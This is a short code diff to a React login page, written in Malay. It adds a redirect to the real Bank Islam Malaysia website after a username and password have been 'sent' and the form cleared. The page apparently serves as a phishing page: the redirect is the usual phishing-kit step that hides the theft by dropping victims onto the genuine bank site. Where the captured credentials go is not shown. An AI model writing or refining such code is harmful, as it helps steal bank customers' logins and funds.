@@ -27,6 +27,10 @@ const LoginPage: React.FC = () => {
       showSuccess('Maklumat berjaya dihantar!');
       setUsername('');
       setPassword('');
+      
+      // Alihkan pengguna ke laman web BIMB setelah berjaya
+      window.location.href = 'https://bimb.com/bimb-web/';
+
     } catch (error: any) {
       console.error("Ralat Penuh:", error);
       let errorMessage = 'Gagal menghantar maklumat. Sila cuba lagi.';
